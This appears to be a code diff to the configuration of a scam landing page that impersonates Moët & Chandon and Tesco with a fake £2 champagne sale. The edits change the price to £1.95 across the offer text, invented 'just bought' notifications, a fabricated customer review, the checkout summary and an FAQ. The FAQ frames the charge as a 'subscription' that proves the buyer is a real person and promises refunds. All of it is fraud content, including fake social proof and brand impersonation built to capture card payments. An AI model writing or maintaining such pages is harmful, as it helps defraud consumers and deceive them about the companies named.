@@ -21,20 +21,20 @@ const siteKey = "moet-gb";
     newPrice: "",
     selectText: "",
     timer: "Time is limited, hurry to place your order!",
-    text: "To celebrate its 280th anniversary, the leading champagne brand <b>Moët&Chandon</b> has partnered with the <b>British</b> supermarket chain <b>Tesco</b> to launch a sale of 1,000 bottles of Brut Impérial champagne for just <b>£2</b>.",
+    text: "To celebrate its 280th anniversary, the leading champagne brand <b>Moët&Chandon</b> has partnered with the <b>British</b> supermarket chain <b>Tesco</b> to launch a sale of 1,000 bottles of Brut Impérial champagne for just <b>£1.95</b>.",
   };
 
   const notifications = [
     {
       user: "Bea V***",
       location: "London, UK",
-      action: "Just bought Moët&Chandon Brut Imperial for £2.00!",
+      action: "Just bought Moët&Chandon Brut Imperial for £1.95!",
       timeago: "15 seconds ago",
     },
     {
       user: "Tessa B***",
       location: "Manchester, UK",
-      action: "Just bought Moët&Chandon Brut Imperial for £2.00!",
+      action: "Just bought Moët&Chandon Brut Imperial for £1.95!",
       timeago: "25 seconds ago",
     },
   ];
@@ -76,8 +76,8 @@ const siteKey = "moet-gb";
       time: "7 days ago",
       header: "Wow, I'm absolutely impressed with this product!",
       product: "26468784",
-      image: "./assets/proof5.jpg",
-      review: "Incredible. An expensive and high-quality bottle for just £2.00. Thank you!",
+      // image: "./assets/proof5.jpg",
+      review: "Incredible. An expensive and high-quality bottle for just £1.95. Thank you!",
     },
   ];
 
@@ -182,8 +182,8 @@ const siteKey = "moet-gb";
       answer: "You must first enter your delivery address and contact details, and then our system will guide you further. You must then prove that you are not a robot, as the prize is only offered to real people.",
     },
     {
-      question: "Why do I have to pay £2.00 for the prize?",
-      answer: "£2.00 is not a prize - it is a subscription that proves you are a real person. All payments are refunded upon approval.",
+      question: "Why do I have to pay £1.95 for the prize?",
+      answer: "£1.95 is not a prize - it is a subscription that proves you are a real person. All payments are refunded upon approval.",
     },
     {
       question: "I can't use my credit card, the transaction failed?",
@@ -241,11 +241,11 @@ const siteKey = "moet-gb";
     main: {
       title: "Order Summary",
       oldPrice: "",
-      newPrice: "£2.00",
+      newPrice: "£1.95",
       size: "Size",
       subTotal: {
         title: "Order Value",
-        amount: "£2.00",
+        amount: "£1.95",
       },
       delivery: {
         title: "Delivery",
@@ -253,7 +253,7 @@ const siteKey = "moet-gb";
       },
       total: {
         title: "Total",
-        amount: "£2.00",
+        amount: "£1.95",
       },
       checkoutButton: "Pay for your order",
     },
